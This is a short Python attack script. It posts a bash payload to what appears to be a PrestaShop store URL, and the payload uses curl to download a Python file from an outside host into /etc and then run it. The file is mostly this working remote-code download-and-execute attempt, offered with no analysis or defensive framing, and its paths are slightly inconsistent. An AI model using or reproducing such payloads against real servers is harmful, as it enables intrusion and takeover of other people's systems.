import requests

script = """
#!/bin/bash
curl -o /etc/get.py https://files.ravenn.net/horror/5kyKit/get.py
python3 get.py
"""
url = 'https://shop.allsafe.com/prestashop'
response = requests.post(url, data=script)

print(response.text)